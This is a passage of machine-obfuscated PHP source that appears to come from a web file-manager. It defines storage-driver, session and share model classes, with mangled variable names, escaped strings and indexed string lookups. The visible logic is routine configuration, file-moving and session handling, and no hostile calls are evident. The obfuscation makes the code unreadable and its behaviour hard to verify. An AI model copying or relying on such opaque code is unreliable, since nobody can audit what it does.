$¸¾•‡Š = "\x6d\157\x64\x69\146\x79\x54\x69\x6d\145", $ºÈïÚúÆ = false) { $ñİã‚“ =& $_SERVER[³à¼î¯á]; $ÍíÔ§û = parent::listData($Éğä™¡™, $¸¾•‡Š, $ºÈïÚúÆ); if ($Éğä™¡™) { return $ÍíÔ§û; } $²ÂÉğŸŸ = array(); if ($GLOBALS[$ñİã‚“[2281]]) { $²ÂÉğŸŸ = $this->ioSizeUseGet(array_to_keyvalue($ÍíÔ§û, $ñİã‚“[12], $ñİã‚“[450])); } foreach ($ÍíÔ§û as $êŠš–é => $òÉÇÀÛ) { unset($ÍíÔ§û[$êŠš–é][$ñİã‚“[6]]); $ÍíÔ§û[$êŠš–é][$ñİã‚“[1941]] = isset($²ÂÉğŸŸ[$òÉÇÀÛ[$ñİã‚“[450]]]) ? $²ÂÉğŸŸ[$òÉÇÀÛ[$ñİã‚“[450]]] : 0; } return $ÍíÔ§û; } public function ioSizeUseGet($‘¡äúòª) { $¡ƒèú˜ =& $_SERVER[³à¼î¯á]; if (!$‘¡äúòª) { return array(); } $ôÌ’ŠÙÆ = $¡ƒèú˜[2282] . implode($¡ƒèú˜[50], $‘¡äúòª); $…Œ›óàÒ = Cache::get($ôÌ’ŠÙÆ); if ($…Œ›óàÒ) { return $…Œ›óàÒ; } $ìƒÄ¼ò¹ = array($¡ƒèú˜[861] => $¡ƒèú˜[450], $¡ƒèú˜[2283] => $¡ƒèú˜[79]); $¡ÓÚÖºª = array($¡ƒèú˜[861] => array($¡ƒèú˜[7], $‘¡äúòª)); $…Œ›óàÒ = Model($¡ƒèú˜[833])->field($ìƒÄ¼ò¹)->where($¡ÓÚÖºª)->group($¡ƒèú˜[861])->select(); $…Œ›óàÒ = array_to_keyvalue($…Œ›óàÒ, $¡ƒèú˜[450], $¡ƒèú˜[79]); Cache::set($ôÌ’ŠÙÆ, $…Œ›óàÒ, 600); return $…Œ›óàÒ; } public function getConfig($”úßñóÑ) { $ÃÅî÷à– = parent::listData($”úßñóÑ); return json_decode($ÃÅî÷à–[$_SERVER[³à¼î¯á][6]], !0); } public function update($ÛßÖ„¡, $¹³‡¹Û) { $ì°÷á¼Ö =& $_SERVER[³à¼î¯á]; $”üİÎõŞ = $¹³‡¹Û[$ì°÷á¼Ö[32]]; $›ÀàŞ° = array_to_keyvalue(parent::listData(), $ì°÷á¼Ö[32]); if (isset($›ÀàŞ°[$”üİÎõŞ]) && $›ÀàŞ°[$”üİÎõŞ][$ì°÷á¼Ö[450]] != $ÛßÖ„¡) { return !1; } $this->checkPwd($ÛßÖ„¡, $¹³‡¹Û); if (isset($¹³‡¹Û[$ì°÷á¼Ö[2284]]) && $¹³‡¹Û[$ì°÷á¼Ö[2284]] == $ì°÷á¼Ö[91]) { $this->checkConfig($¹³‡¹Û); } unset($¹³‡¹Û[$ì°÷á¼Ö[2284]]); $‚“ƒûÚí = parent::update($ÛßÖ„¡, $¹³‡¹Û); if ($‚“ƒûÚí && $¹³‡¹Û[$ì°÷á¼Ö[37]]) { $¶¯ÑîÓ’ = 0; foreach ($›ÀàŞ° as $Ò¯’Îô¹) { if ($Ò¯’Îô¹[$ì°÷á¼Ö[37]] && $Ò¯’Îô¹[$ì°÷á¼Ö[450]] != $ÛßÖ„¡) { $¶¯ÑîÓ’ = $Ò¯’Îô¹[$ì°÷á¼Ö[450]]; parent::update($Ò¯’Îô¹[$ì°÷á¼Ö[450]], array($ì°÷á¼Ö[37] => 0)); } } $this->updateBackup($ÛßÖ„¡, $¶¯ÑîÓ’); } return $‚“ƒûÚí; } public function add($‹¨¿öËÄ) { $±ÕÜ³‚î =& $_SERVER[³à¼î¯á]; $÷ŒØşÖ’ = array_to_keyvalue(parent::listData(), $±ÕÜ³‚î[32]); if (isset($÷ŒØşÖ’[$‹¨¿öËÄ[$±ÕÜ³‚î[32]]])) { return !1; } $this->checkConfig($‹¨¿öËÄ); $éÓ«¾èµ = parent::insert($‹¨¿öËÄ); if ($éÓ«¾èµ && $‹¨¿öËÄ[$±ÕÜ³‚î[37]]) { foreach ($÷ŒØşÖ’ as $”¾¶Œ¤¬) { if ($”¾¶Œ¤¬[$±ÕÜ³‚î[37]]) { parent::update($”¾¶Œ¤¬[$±ÕÜ³‚î[450]], array($±ÕÜ³‚î[37] => 0)); } } } return $éÓ«¾èµ; } public function updateBackup($Ğ•á¹½×, $Ï ¶¸Å) { $Ğæ¼¬Šê =& $_SERVER[³à¼î¯á]; if (!$Ï ¶¸Å) { return; } $û¯†òÔ™ = Model($Ğæ¼¬Šê[794])->config(); if ($û¯†òÔ™[$Ğæ¼¬Šê[1723]] != $Ğæ¼¬Šê[91] || $û¯†òÔ™[$Ğæ¼¬Šê[796]] != $Ï ¶¸Å) { return; } $¼Áüòõ¢ = Model($Ğæ¼¬Šê[815])->get($Ğæ¼¬Šê[827]); $¼Áüòõ¢ = json_decode($¼Áüòõ¢, !0); if (!$¼Áüòõ¢) { return; } $¼Áüòõ¢[$Ğæ¼¬Šê[796]] = $Ğ•á¹½×; Model($Ğæ¼¬Šê[815])->set(array($Ğæ¼¬Šê[827] => $¼Áüòõ¢)); } public function checkPwd($°ØÏ¨àº, &$úìÆå‘») { $àÑ¨öĞ =& $_SERVER[³à¼î¯á]; if (empty($úìÆå‘»[$àÑ¨öĞ[6]])) { return; } $öşâ«³  = json_decode($úìÆå‘»[$àÑ¨öĞ[6]], !0); $Ÿ¦³Ñêø = $àÑ¨öĞ[12]; $äØ¦¥ºò = array($àÑ¨öĞ[2285], $àÑ¨öĞ[2286], $àÑ¨öĞ[937]); foreach ($äØ¦¥ºò as $ˆ‡âİ§ô) { if (isset($öşâ«³ [$ˆ‡âİ§ô])) { $Ÿ¦³Ñêø = $ˆ‡âİ§ô; break; } } if (!$Ÿ¦³Ñêø) { return; } $ÈŒÃÁºŠ = $this->getConfig($°ØÏ¨àº); $êı®Æ²± = $ÈŒÃÁºŠ[$Ÿ¦³Ñêø]; $‡€˜ãˆ“ = $öşâ«³ [$Ÿ¦³Ñêø]; if ($‡€˜ãˆ“ == str_repeat($àÑ¨öĞ[211], strlen($êı®Æ²±))) { $öşâ«³ [$Ÿ¦³Ñêø] = $êı®Æ²±; $úìÆå‘»[$àÑ¨öĞ[6]] = json_encode($öşâ«³ ); } else { if ($‡€˜ãˆ“ != $êı®Æ²±) { $úìÆå‘»[$àÑ¨öĞ[2284]] = $àÑ¨öĞ[91]; } } } public function checkConfig(&$ëÔ¤İ ù, $œ§Áôèš = false) { $§ëÉà¥ =& $_SERVER[³à¼î¯á]; $•‰¿‚Ş¢ = strtolower($ëÔ¤İ ù[$§ëÉà¥[98]]); $„Á¦’Á¸ = json_decode($ëÔ¤İ ù[$§ëÉà¥[6]], !0); foreach ($„Á¦’Á¸ as $‚Â³×Éí => $…§Ë³») { if (is_string($…§Ë³»)) { $„Á¦’Á¸[$‚Â³×Éí] = trim($…§Ë³»); } } $„Á¦’Á¸[$§ëÉà¥[2287]] = rand_string(6); $¯Ã°•—Ò = $GLOBALS[$§ëÉà¥[6]][$§ëÉà¥[92]][$§ëÉà¥[870]]; $¨­ß = isset($¯Ã°•—Ò[$•‰¿‚Ş¢]) ? $¯Ã°•—Ò[$•‰¿‚Ş¢] : ucfirst($•‰¿‚Ş¢); $ıòèÁÎŠ = $§ëÉà¥[77] . $¨­ß; if (!$¨­ß || !class_exists($ıòèÁÎŠ)) { if ($œ§Áôèš) { return LNG($§ëÉà¥[2288]); } write_log(array($§ëÉà¥[2289], $ëÔ¤İ ù, get_caller_info()), $§ëÉà¥[206]); show_json(LNG($§ëÉà¥[2288]), !1, $ëÔ¤İ ù); } $Ò‘¿¹—ú = new $ıòèÁÎŠ($„Á¦’Á¸); if (in_array($•‰¿‚Ş¢, $Ò‘¿¹—ú->objectDriver)) { try { if (!$Ò‘¿¹—ú->isBucketCors() && !$Ò‘¿¹—ú->setBucketCors()) { $–‘¯Šêâ = LNG($§ëÉà¥[2290]); $–‘¯Šêâ .= $§ëÉà¥[2291] . LNG($§ëÉà¥[2292]); } } catch (Exception $é¥Í¼£Ø) { $–‘¯Šêâ = $é¥Í¼£Ø->getMessage(); } if (isset($–‘¯Šêâ)) { return $this->_parseError($–‘¯Šêâ, $•‰¿‚Ş¢, $œ§Áôèš); } } $÷šñ–à¹ = rtrim($„Á¦’Á¸[$§ëÉà¥[1234]], $§ëÉà¥[8]) . $§ëÉà¥[8]; $ÌÑ—Ï£® = $Ò‘¿¹—ú->getPath($÷šñ–à¹ . $§ëÉà¥[1238]); try { $ğ¹ûÇâ = $Ò‘¿¹—ú->mkfile($ÌÑ—Ï£®); if (!$ğ¹ûÇâ) { $–‘¯Šêâ = LNG($§ëÉà¥[2290]); } } catch (Exception $é¥Í¼£Ø) { $–‘¯Šêâ = $é¥Í¼£Ø->getMessage(); } if (isset($–‘¯Šêâ)) { return $this->_parseError($–‘¯Šêâ, $•‰¿‚Ş¢, $œ§Áôèš); } if ($•‰¿‚Ş¢ == $§ëÉà¥[68] && !$Ò‘¿¹—ú->checkRegion()) { return $this->_parseError(LNG($§ëÉà¥[2293]), $•‰¿‚Ş¢, $œ§Áôèš); } $„Á¦’Á¸[$§ëÉà¥[1234]] = $÷šñ–à¹; $ëÔ¤İ ù[$§ëÉà¥[6]] = json_encode($„Á¦’Á¸); $ëÔ¤İ ù[$§ëÉà¥[98]] = $¨­ß; return !0; } private function _parseError($Ëò™Ş“æ, $Â—¹Ç€£, $€Ù¹÷Œü = false) { $ßœ·òÓ =& $_SERVER[³à¼î¯á]; if ($Â—¹Ç€£ == $ßœ·òÓ[68] && stripos($Ëò™Ş“æ, $ßœ·òÓ[2294])) { $ßËë„ = explode($ßœ·òÓ[10], $Ëò™Ş“æ); $Ê—ÚñÏ = isset($ßËë„[1]) ? $ßËë„[1] : $ßœ·òÓ[12]; $‚´‡©î§ = array($ßœ·òÓ[2295] => LNG($ßœ·òÓ[2296]), $ßœ·òÓ[2297] => LNG($ßœ·òÓ[2298])); if (isset($‚´‡©î§[$Ê—ÚñÏ])) { $Ëò™Ş“æ = $‚´‡©î§[$Ê—ÚñÏ]; } } if (stripos($Ëò™Ş“æ, $ßœ·òÓ[2299]) === 0) { $«—š€ôÆ = strpos($Ëò™Ş“æ, $ßœ·òÓ[168]); if ($«—š€ôÆ === !1) { $«—š€ôÆ = strpos($Ëò™Ş“æ, $ßœ·òÓ[4]); } if ($«—š€ôÆ !== !1) { $Ëò™Ş“æ = substr($Ëò™Ş“æ, $«—š€ôÆ + 1); } } $Ëò™Ş“æ = LNG($ßœ·òÓ[1240]) . $Ëò™Ş“æ; if ($€Ù¹÷Œü) { return $Ëò™Ş“æ; } show_json($Ëò™Ş“æ, !1); } public function driverListSystem() { $³İş†­‡ =& $_SERVER[³à¼î¯á]; $¾ê ”Èê = parent::listData(); $Õó¥£Ï¶ = array(); foreach ($¾ê ”Èê as $É÷Ñ§Ùî) { unset($É÷Ñ§Ùî[$³İş†­‡[222]], $É÷Ñ§Ùî[$³İş†­‡[88]]); $É÷Ñ§Ùî[$³İş†­‡[6]] = json_decode($É÷Ñ§Ùî[$³İş†­‡[6]], !0); $Õó¥£Ï¶[] = $É÷Ñ§Ùî; } return $Õó¥£Ï¶; } public function defaultDriver() { $ğš†¬ª =& $_SERVER[³à¼î¯á]; $©”“’¯¢ = parent::listData(); $§ùßõø‹ = array_filter_by_field($©”“’¯¢, $ğš†¬ª[37], 1); $§ùßõø‹ = $§ùßõø‹[0]; if ($§ùßõø‹) { $§ùßõø‹[$ğš†¬ª[6]] = json_decode($§ùßõø‹[$ğš†¬ª[6]], !0); } return $§ùßõø‹; } public function driverInfo($ºÜíµú ) { $¹ Ù ±— =& $_SERVER[³à¼î¯á]; $ãÅ¶ÕİÕ = array_to_keyvalue(parent::listData(), $¹ Ù ±—[450]); if (!isset($ãÅ¶ÕİÕ[$ºÜíµú ])) { return !1; } $ã»İİ²˜ = $ãÅ¶ÕİÕ[$ºÜíµú ]; $ã»İİ²˜[$¹ Ù ±—[6]] = json_decode($ã»İİ²˜[$¹ Ù ±—[6]], !0); return $ã»İİ²˜; } public function remove($“µ“ˆı) { $this->removeShareItems($“µ“ˆı); return parent::remove($“µ“ˆı); } public function removeWithFile($ÕÔÍİæ , $âæ‰‘È†, $Ö„ÁôÓ, $ÒšÒ›í’ = false) { $ŠœÜŠƒä =& $_SERVER[³à¼î¯á]; $°¯ù©§² = array($ŠœÜŠƒä[861] => $ÕÔÍİæ ); $¥æºâù… = Model($ŠœÜŠƒä[519])->where($°¯ù©§²)->count(); $ÕÔÕ“ë’ = Model($ŠœÜŠƒä[519])->where($°¯ù©§²)->sum($ŠœÜŠƒä[79]); $ºµ³õ = $âæ‰‘È† . $ŠœÜŠƒä[2300] . $ÕÔÍİæ ; $–´¯îŒÔ = LNG($âæ‰‘È† == $ŠœÜŠƒä[595] ? $ŠœÜŠƒä[2301] : $ŠœÜŠƒä[2302]); $ö‹…å‡Ü = new TaskFileTransfer($ºµ³õ, $ŠœÜŠƒä[206], $¥æºâù…, $–´¯îŒÔ . $ŠœÜŠƒä[437] . $Ö„ÁôÓ[$ŠœÜŠƒä[32]] . $ŠœÜŠƒä[205] . $ÕÔÍİæ ); $ö‹…å‡Ü->task[$ŠœÜŠƒä[808]] = (double) $ÕÔÕ“ë’; $ÑÌêÃ = KodIO::defaultDriver(); $—¥ª“Ëİ = $ÑÌêÃ[$ŠœÜŠƒä[450]]; $€¡Ùğ˜¨ = $ğÈŞ½ªë = $Ø×Ğ’è‘ = array(); $ªËãÃƒ± = Model($ŠœÜŠƒä[221])->where($°¯ù©§²)->field($ŠœÜŠƒä[2303])->select(); foreach ($ªËãÃƒ± as $˜±ıÍ°Œ) { $ÏŠ¿Ùû¡ = $˜±ıÍ°Œ[$ŠœÜŠƒä[516]]; if ($ÒšÒ›í’) { $ğÈŞ½ªë[] = $ÏŠ¿Ùû¡; continue; } $Ê®¨Ù¥ö = $˜±ıÍ°Œ[$ŠœÜŠƒä[87]]; $Œ˜ã©ãÂ = get_path_father($Ê®¨Ù¥ö); $Ø×Ğ’è‘[] = $Œ˜ã©ãÂ; $Œ˜ã©ãÂ = str_replace("\173\151\157\72{$ÕÔÍİæ }\x7d\x2f", "\x7b\151\x6f\x3a{$—¥ª“Ëİ}\x7d\57", $Œ˜ã©ãÂ); if (!IO::exist($Ê®¨Ù¥ö)) { $€¡Ùğ˜¨[] = $ÏŠ¿Ùû¡; $ö‹…å‡Ü->updateFileEnd($˜±ıÍ°Œ[$ŠœÜŠƒä[32]], $˜±ıÍ°Œ[$ŠœÜŠƒä[79]]); write_log($ŠœÜŠƒä[2304] . $Ê®¨Ù¥ö, $ŠœÜŠƒä[1884]); continue; } $¬®Ä¥Ã = IO::move($Ê®¨Ù¥ö, $Œ˜ã©ãÂ, REPEAT_RENAME); if (!$¬®Ä¥Ã) { $ğÈŞ½ªë[] = $ÏŠ¿Ùû¡; $ö‹…å‡Ü->updateFileEnd($˜±ıÍ°Œ[$ŠœÜŠƒä[32]], $˜±ıÍ°Œ[$ŠœÜŠƒä[79]]); write_log($ŠœÜŠƒä[2305] . $Ê®¨Ù¥ö, $ŠœÜŠƒä[1884]); continue; } $°¯ù©§² = array($ŠœÜŠƒä[516] => $ÏŠ¿Ùû¡); $íµ½ù’¤ = array($ŠœÜŠƒä[861] => $—¥ª“Ëİ, $ŠœÜŠƒä[87] => $¬®Ä¥Ã); Model($ŠœÜŠƒä[221])->where($°¯ù©§²)->save($íµ½ù’¤); } $ˆÒÕ­íÈ = $ö‹…å‡Ü->task; if (!$ÒšÒ›í’) { Cache::set($ºµ³õ, $ˆÒÕ­íÈ); } $ö‹…å‡Ü->end(); $€¡Ùğ˜¨ = array_unique($€¡Ùğ˜¨); $ğÈŞ½ªë = array_unique($ğÈŞ½ªë); if (!$ÒšÒ›í’ && ($€¡Ùğ˜¨ || $ğÈŞ½ªë)) { $œÖøâ›ô = array(); if ($€¡Ùğ˜¨) { $œÖøâ›ô[] = sprintf(LNG($ŠœÜŠƒä[2306]), count($€¡Ùğ˜¨)); } if ($ğÈŞ½ªë) { $œÖøâ›ô[] = sprintf(LNG($ŠœÜŠƒä[2307]), count($ğÈŞ½ªë)); } $œÖøâ›ô = sprintf(LNG($ŠœÜŠƒä[2308]), implode($ŠœÜŠƒä[2309], $œÖøâ›ô)) . $ŠœÜŠƒä[2310] . date($ŠœÜŠƒä[2311]) . $ŠœÜŠƒä[2312]; if ($âæ‰‘È† == $ŠœÜŠƒä[1921]) { $œÖøâ›ô .= $ŠœÜŠƒä[2313] . LNG($ŠœÜŠƒä[2314]); } $ˆÒÕ­íÈ[$ŠœÜŠƒä[1236]] = $œÖøâ›ô; Cache::set($ºµ³õ, $ˆÒÕ­íÈ); unset($Ö„ÁôÓ[$ŠœÜŠƒä[6]]); $Ÿ¤†şÖ— = array($ŠœÜŠƒä[450] => $ÕÔÍİæ , $ŠœÜŠƒä[2191] => $ŠœÜŠƒä[595], $ŠœÜŠƒä[32] => $Ö„ÁôÓ[$ŠœÜŠƒä[32]], $ŠœÜŠƒä[1256] => $Ö„ÁôÓ); Hook::trigger($ŠœÜŠƒä[1764], array($ŠœÜŠƒä[1256] => $Ÿ¤†şÖ—, $ŠœÜŠƒä[1266] => !0)); show_json($œÖøâ›ô, !1, 100111); } if ($âæ‰‘È† == $ŠœÜŠƒä[595]) { return !0; } if ($€¡Ùğ˜¨ || $ğÈŞ½ªë) { $”“Ñè ½ = array_merge($€¡Ùğ˜¨, $ğÈŞ½ªë); $”“Ñè ½ = array_filter(array_unique($”“Ñè ½)); $this->removeByFileID($”“Ñè ½); } if ($Ø×Ğ’è‘) { $Ø×Ğ’è‘ = array_filter(array_unique($Ø×Ğ’è‘)); foreach ($Ø×Ğ’è‘ as $Ê®¨Ù¥ö) { $ŸØıÆ”ƒ = IO::has($Ê®¨Ù¥ö, !0); if (!$ŸØıÆ”ƒ[$ŠœÜŠƒä[230]] && !$ŸØıÆ”ƒ[$ŠœÜŠƒä[231]]) { IO::remove($Ê®¨Ù¥ö); } } } return $this->remove($ÕÔÍİæ ); } private function removeByFileID($ñàŸÇ– = array()) { $Æì´…øÄ =& $_SERVER[³à¼î¯á]; if (empty($ñàŸÇ–)) { return; } $È˜ıÏ÷è = array($Æì´…øÄ[516] => array($Æì´…øÄ[7], $ñàŸÇ–)); $Ëì©¡ª² = Model($Æì´…øÄ[1388])->where($È˜ıÏ÷è)->field($Æì´…øÄ[184])->select(); if (!$Ëì©¡ª²) { return Model($Æì´…øÄ[519])->remove($ñàŸÇ–); } $Ëì©¡ª² = array_to_keyvalue($Ëì©¡ª², $Æì´…øÄ[12], $Æì´…øÄ[184]); foreach ($Ëì©¡ª² as $é¦ëûğî) { Model($Æì´…øÄ[869])->removeNow($é¦ëûğî, !1); } } private function removeShareItems($Ú¨ğõÑá) { $Šº™èÜò =& $_SERVER[³à¼î¯á]; $½¢åÆ˜¥ = "\x7b\x69\x6f\72{$Ú¨ğõÑá}\x7d\57"; $ÈŞà« = array($Šº™èÜò[184] => 0, $Šº™èÜò[1229] => array($Šº™èÜò[434], "{$½¢åÆ˜¥}\45")); $‹Æßğç² = Model($Šº™èÜò[1932])->where($ÈŞà«)->field($Šº™èÜò[640])->select(); if (empty($‹Æßğç²)) { return; } $Ş¼˜Í¥Œ = array_to_keyvalue($‹Æßğç², $Šº™èÜò[12], $Šº™èÜò[640]); Model($Šº™èÜò[639])->remove($Ş¼˜Í¥Œ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\x4c\x69\x67\x68\164\x41\x70\160"; public $modelType = "\123\171\163\x74\145\155\117\160\x74\151\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\x67\162\x6f\x75\x70", "\x64\145\x73\x63", "\x63\157\x6e\x74\x65\156\x74"); public function listData($¾ìÛ¼² = false, $¾Ò™§— = "\155\x6f\x64\x69\146\171\x54\151\x6d\145", $¦›¡ = true) { return parent::listData($¾ìÛ¼², $¾Ò™§—, $¦›¡); } public function remove($ª« á£ç) { $»â´Ô = $this->findByName($ª« á£ç); if (!$»â´Ô) { return !1; } return parent::remove($»â´Ô[$_SERVER[³à¼î¯á][450]]); } public function add($ºèşñˆê) { if ($this->findByName($ºèşñˆê[$_SERVER[³à¼î¯á][32]])) { return !1; } return parent::insert($ºèşñˆê); } public function update($ÖµıŞÒ, $ı¨õ´ìõ) { $İĞŸ¹¥Ò =& $_SERVER[³à¼î¯á]; $éÃì‡Àì = $this->findByName($ÖµıŞÒ); $ßë×ì– = $this->findByName($ı¨õ´ìõ[$İĞŸ¹¥Ò[32]]); if (!$éÃì‡Àì || $ßë×ì– && $ßë×ì–[$İĞŸ¹¥Ò[450]] != $éÃì‡Àì[$İĞŸ¹¥Ò[450]]) { return !1; } return parent::update($éÃì‡Àì[$İĞŸ¹¥Ò[450]], $ı¨õ´ìõ); } } goto aƒ½¹ÄÉ¯å; Fëµ©í“…: class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\137\163\145\163\x73\151\157\x6e"; public function get($ ›—¥­») { $öİÉ—Ş =& $_SERVER[³à¼î¯á]; $š¹©Ôœœ = $this->where(array($öİÉ—Ş[2092] => $ ›—¥­»))->find(); if (!is_array($š¹©Ôœœ)) { return !1; } return $š¹©Ôœœ[$öİÉ—Ş[799]]; } public function set($ûÄÙµ’Ó, $±¡‚×ùÄ, $áÒù›¬è = 3600) { $Êûçğİí =& $_SERVER[³à¼î¯á]; $…ì¬ö = array($Êûçğİí[2092] => $ûÄÙµ’Ó, $Êûçğİí[1991] => $±¡‚×ùÄ, $Êûçğİí[2093] => $áÒù›¬è + time()); if (Session::get($Êûçğİí[2094])) { $…ì¬ö[$Êûçğİí[1753]] = Session::get($Êûçğİí[2094]); } else { $…ì¬ö[$Êûçğİí[1753]] = 0; } if ($this->get($ûÄÙµ’Ó)) { return $this->where(array($Êûçğİí[2092] => $ûÄÙµ’Ó))->save($…ì¬ö); } else { return $this->add($…ì¬ö, array(), !0); } } public function remove($ôÌ§Ì¾¶) { return $this->where(array($_SERVER[³à¼î¯á][2092] => $ôÌ§Ì¾¶))->delete(); } public function clearTimeout() { return $this->where($_SERVER[³à¼î¯á][2095] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\155\157\144\151\146\171\124\151\155\x65", "\164\x69\155\145", "\151\156\163\x65\x72\164\54\165\x70\x64\141\x74\x65", "\146\165\x6e\143\x74\x69\x6f\x6e"), array("\x63\x72\x65\141\x74\x65\124\151\155\145", "\164\x69\x6d\145", "\x69\156\x73\x65\x72\164", "\146\165\x6e\x63\164\x69\x6f\x6e"), array("\x6f\160\x74\151\x6f\x6e\x73", '', "\x69\x6e\163\x65\x72\x74\54\x75\160\x64\141\164\x65\x2c\163\x65\154\145\x63\x74", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($ûé®–íŠ) { $Ş®»‰ÔÀ =& $_SERVER[³à¼î¯á]; $¦ÇÖ˜¬ = isset($ûé®–íŠ[0]) ? $ûé®–íŠ[0] : !1; return array($Ş®»‰ÔÀ[2096] => array(USER_ID, $Ş®»‰ÔÀ[2097]), $Ş®»‰ÔÀ[2037] => array($¦ÇÖ˜¬, $Ş®»‰ÔÀ[2098])); } protected function listSimple() { $ÈÂ…½ = array($_SERVER[³à¼î¯á][1753] => USER_ID); $òôÀ²Â¨ = $this->field($this->fieldList)->where($ÈÂ…½)->select(); return $òôÀ²Â¨ ? $òôÀ²Â¨ : array(); } protected function getInfo($³´¾¤æ´, $¤ßàÒë± = false) { $Ã•ËÓÖæ =& $_SERVER[³à¼î¯á]; if ($¤ßàÒë±) { return $this->_getShareInfo(array($Ã•ËÓÖæ[640] => $³´¾¤æ´)); } $ñœâ¿Œö = $this->cacheFunctionGet($Ã•ËÓÖæ[2039], $³´¾¤æ´); return $ñœâ¿Œö; } public function getInfoByHash($ Â½¬ù) { return $this->_getShareInfo(array($_SERVER[³à¼î¯á][2099] => $ Â½¬ù)); } public function getInfoByPath($·ÉıÒµÃ) { $ÉâåÊğÒ =& $_SERVER[³à¼î¯á]; $œ¯àÄ¤÷ = array($ÉâåÊğÒ[1753] => USER_ID, $ÉâåÊğÒ[184] => $·ÉıÒµÃ); return $this->_getShareInfo($œ¯àÄ¤÷); } public function getInfoBySourcePath($¥ĞˆŞ€¥) { $æÇ¯×¹ƒ =& $_SERVER[³à¼î¯á]; $’¨‰Ğ™Å = array($æÇ¯×¹ƒ[1753] => USER_ID, $æÇ¯×¹ƒ[1229] => $¥ĞˆŞ€¥); return $this->_getShareInfo($’¨‰Ğ™Å); } private function _getShareInfo($†Íèï¿İ) { $Ÿ’üÄô =& $_SERVER[³à¼î¯á]; $ÅşŠµ®ª = $this->where($†Íèï¿İ)->find(); if (!$ÅşŠµ®ª) { return !1; } $†Íèï¿İ = array($Ÿ’üÄô[640] => $ÅşŠµ®ª[$Ÿ’üÄô[640]]); $ö‡ÏêÌ = $Ÿ’üÄô[2100]; $â–İ¶¨‡ = Model($Ÿ’üÄô[641])->order($Ÿ’üÄô[450])->field($ö‡ÏêÌ)->where($†Íèï¿İ)->select(); if ($ÅşŠµ®ª[$Ÿ’üÄô[184]] == $Ÿ’üÄô[219]) { $ÅşŠµ®ª[$Ÿ’üÄô[90]] = IO::info($ÅşŠµ®ª[$Ÿ’üÄô[1229]]); } else { $ÅşŠµ®ª[$Ÿ’üÄô[90]] = Model($Ÿ’üÄô[1388])->pathInfo($ÅşŠµ®ª[$Ÿ’üÄô[184]]); } $ÅşŠµ®ª[$Ÿ’üÄô[2101]] = $â–İ¶¨‡; return $ÅşŠµ®ª; } protected function getInfoAuth($¢¼¶Ÿéô) { $°Ç†ß¼‡ =& $_SERVER[³à¼î¯á]; $Ø¼»œí = $this->getInfo($¢¼¶Ÿéô); if ($Ø¼»œí[$°Ç†ß¼‡[1753]] == USER_ID) { $Ø¼»œí[$°Ç†ß¼‡[462]] = $Ø¼»œí[$°Ç†ß¼‡[90]][$°Ç†ß¼‡[462]]; } else { $Ø¼»œí[$°Ç†ß¼‡[462]] = Model($°Ç†ß¼‡[543])->authMake($Ø¼»œí[$°Ç†ß¼‡[2101]]); } return $Ø¼»œí; } protected function listData($ŸÜÊ·Ÿ· = null, $¤“‘ö×— = 300) { $à¥Ş“½£ =& $_SERVER[³à¼î¯á]; $€ÒËÜ = array(array($à¥Ş“½£[538] => array($à¥Ş“½£[1062], 0), $à¥Ş“½£[638] => array($à¥Ş“½£[1062], 0), $à¥Ş“½£[2102] => $à¥Ş“½£[2055])); if ($ŸÜÊ·Ÿ· == $à¥Ş“½£[2103]) { $€ÒËÜ = array($à¥Ş“½£[538] => 1); } else { if ($ŸÜÊ·Ÿ· == $à¥Ş“½£[1214]) { $€ÒËÜ = array($à¥Ş“½£[638] => 1); } } $€ÒËÜ[$à¥Ş“½£[1753]] = USER_ID; $¬÷Ó¸ó‚ = $this->where($€ÒËÜ)->selectPage($¤“‘ö×—); return $¬÷Ó¸ó‚; } protected function listToMe($Ê«Ÿëùû = 300) { $ú¬Êà²¢ =& $_SERVER[³à¼î¯á]; $œÛÆ£‘ = Model($ú¬Êà²¢[2104])->userGroupParents(USER_ID); $ÂçÆË‹Ã = array($ú¬Êà²¢[623] => SourceModel::TYPE_USER, $ú¬Êà²¢[545] => USER_ID); if ($œÛÆ£‘) { $ÂçÆË‹Ã = array(array($ú¬Êà²¢[623] => SourceModel::TYPE_USER, $ú¬Êà²¢[545] => USER_ID), array($ú¬Êà²¢[623] => SourceModel::TYPE_GROUP, $ú¬Êà²¢[545] => array($ú¬Êà²¢[7], $œÛÆ£‘)), $ú¬Êà²¢[2102] => $ú¬Êà²¢[2055]); } $ªÈ³ ğ = Model($ú¬Êà²¢[641])->where($ÂçÆË‹Ã)->selectPage($Ê«Ÿëùû); $ïÀøµ¤‘ = array_to_keyvalue_group($ªÈ³ ğ[$ú¬Êà²¢[420]], $ú¬Êà²¢[640]); if (!$ïÀøµ¤‘) { return $ªÈ³ ğ; } $•Òµİ½ù = $ú¬Êà²¢[2105]; $ÂçÆË‹Ã = array($ú¬Êà²¢[640] => array($ú¬Êà²¢[467], array_keys($ïÀøµ¤‘)), $ú¬Êà²¢[1753] => array($ú¬Êà²¢[1064], $ú¬Êà²¢[219])); $¿ªÑ–Æ = $this->field($•Òµİ½ù)->where($ÂçÆË‹Ã)->select(); foreach ($¿ªÑ–Æ as $‚¾Î©©Â => &$ğìêãó•) { $ğìêãó•[$ú¬Êà²¢[2101]] = $ïÀøµ¤‘[$ğìêãó•[$ú¬Êà²¢[640]]]; } unset($ğìêãó•); $Îà÷æØ» = array($ú¬Êà²¢[2106] => $¿ªÑ–Æ, $ú¬Êà²¢[2107] => $ªÈ³ ğ[$ú¬Êà²¢[417]]); return $Îà÷æØ»; } protected function shareAdd($÷Ñëú’ü, $õ˜®Ãôã) { $ª¥‘êµ­ =& $_SERVER[³à¼î¯á]; $‰•ÑÚ§ = $this->_addShareData($÷Ñëú’ü, $õ˜®Ãôã); if (!empty($õ˜®Ãôã[$ª¥‘êµ­[2108]])) { $this->_shareAuthSet($‰•ÑÚ§, $õ˜®Ãôã[$ª¥‘êµ­[2108]]); } $this->shareEventAdd($÷Ñëú’ü, $õ˜®Ãôã, $ª¥‘êµ­[2109]); return $‰•ÑÚ§; } protected function shareAddSystem($¨Ã„¼÷µ, $Ö€®Å•Š) { $»â‰¸¥Á =& $_SERVER[³à¼î¯á]; $ÂÛ™È›„ = $this->_addShareData($¨Ã„¼÷µ, $Ö€®Å•Š, $»â‰¸¥Á[182]); 